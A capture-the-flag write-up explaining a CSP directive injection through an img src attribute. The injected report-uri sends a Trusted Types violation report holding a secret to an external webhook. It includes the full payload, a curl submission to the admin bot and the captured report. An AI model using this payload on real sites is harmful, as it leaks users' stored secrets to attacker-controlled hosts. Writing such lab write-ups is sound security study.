
# SUPER-SECRET-NOTES : WRITE-UP

The application starts with a basic CSP configuration:
```javascript
const csp = [
    "default-src 'none'",
    "style-src 'unsafe-inline'",
    "script-src 'unsafe-inline'"
];
```

When a user provides a `note` parameter, the application extracts `src` attributes and adds them to the CSP:
```javascript
if (trustedDomains.length) {
    csp.push(`img-src ${trustedDomains.join(' ')}`);
}
```

## Understanding the Sandbox Implementation
Here is the sandbox implementation where you might think that we have to by pass this inorder to get the flag 

```javascript
const frame = document.createElement('iframe');
frame.srcdoc = note;
frame.sandbox = '';  // Empty sandbox = maximum restrictions
```

An empty sandbox attribute applies all restrictions, including:
- JavaScript execution prevention
- localStorage access blocking
- Form submission prevention
- Top-level navigation blocking

before seeing why we dont need to by pass the sandbox iframe lets see what the required-trusted-types-for directive does 


The require-trusted-types-for 'script' directive enforces runtime checks on DOM XSS injection sinks. When we inject this directive through our payload, it forces the browser to validate all string-to-script assignments against a Trusted Types policy.

```javascript
const secret = localStorage.getItem('flag');
document.getElementById('secret').innerHTML = secret;
```

This innerHTML assignment becomes our exfiltration point because , The main page reads the flag from localStorage and it then attempts to assign the flag value directly to innerHTMLbut now Without a Trusted Type policy defined, this assignment violates the CSP ,this cspviolation triggers a report containing the flag value

## Why Sandbox Bypass Isn't Required

The exploit succeeds without breaking the sandbox because:

The attack vector operates entirely in the main page context. The main page contains the code that reads localStorage and assigns to innerHTML. While our payload is delivered through the sandboxed iframe, the actual exploitation happens outside it.

```javascript
//injected csp 
csp.push(`img-src *; require-trusted-types-for 'script'; report-uri https://webhook.site/[ID]`);

// this gets exectued outside the sandbox 
const secret = localStorage.getItem('flag');
document.getElementById('secret').innerHTML = secret;
//which inturn results in a csp violation which gets sent to the report uri with the flag 
```

## STEPS
1. We send our payload:
```html
<img src="*; require-trusted-types-for 'script'; report-uri https://webhook.site/[ID]">
```

2. The server constructs a CSP that includes our injected directives:
```
default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src *; require-trusted-types-for 'script'; report-uri https://webhook.site/[ID]
```

3. When the admin bot visits:
   The main page loads with our modified CSP
   The bot sets the flag in localStorage
   The page reads the flag and attempts the innerHTML assignment
   The assignment violates Trusted Types policy
   The violation report containing the flag is sent to our webhook

## More into the CSP construction 

The vulnerability stems from string concatenation in CSP construction. The application joins trusted domains with spaces:
```javascript
csp.push(`img-src ${trustedDomains.join(' ')}`);
```

When we inject a semicolon in our src attribute, it breaks out of the img-src directive:
```javascript
// Our input
src="*; require-trusted-types-for 'script'; report-uri https://webhook.site/[ID]"

// Becomes part of CSP
img-src *; require-trusted-types-for 'script'; report-uri https://webhook.site/[ID]
```

This effectively adds new CSP directives that the application never intended to include.

## Submitting the constrcuted payload to the bot 

```bash
  curl -X POST https://bot1.ctf.prgy.in/submit \
    -H "Content-Type: application/json" \
    -d '{"url":"https://secretnotes.ctf.prgy.in/?note=&note=%3Cimg%20src=%22*;%20require-trusted-types-for%20%27script%27;%20report-uri%20https://webhook.site/b2713cd0-1ca0-4d4c-aa0a-6182a7a65be5%22%3E"}'
```
which gives the csp report in the webhook url to be 

```bash
{
  "csp-report": {
    "document-uri": "https://secretnotes.ctf.prgy.in/?note=&note=%3Cimg%20src=%22*;%20require-trusted-types-for%20%27script%27;%20report-uri%20https://webhook.site/85503685-ac6d-451d-838b-5e49ec9eb8f5%22%3E",
    "referrer": "",
    "violated-directive": "require-trusted-types-for",
    "effective-directive": "require-trusted-types-for",
    "original-policy": "default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src *; require-trusted-types-for 'script'; report-uri https://webhook.site/85503685-ac6d-451d-838b-5e49ec9eb8f5",
    "disposition": "enforce",
    "blocked-uri": "trusted-types-sink",
    "line-number": 135,
    "column-number": 57,
    "source-file": "https://secretnotes.ctf.prgy.in/",
    "status-code": 200,
    "script-sample": "Element innerHTML|pctf{1_l0v3_3c9_1n63ct10n}"
  }
```
Thus we get the flag 
```bash
p_ctf{1_l0v3_3c9_1n63ct10n}
```
